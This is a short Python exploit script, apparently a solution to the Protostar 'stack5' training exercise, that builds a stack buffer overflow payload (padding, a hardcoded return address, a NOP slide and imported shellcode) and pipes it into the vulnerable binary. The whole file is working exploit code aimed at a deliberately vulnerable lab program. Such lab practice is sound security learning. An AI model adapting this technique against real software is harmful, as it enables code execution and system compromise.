#!/usr/bin/env python2.6

import struct
import utils

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
jump_addr = struct.pack("I", 0xbffff6c0)
nopslide = "\x90" * 20
payload = padding + jump_addr + nopslide +  utils.SHELLCODE

utils.run_file_with_stdin("/opt/protostar/bin/stack5", payload)
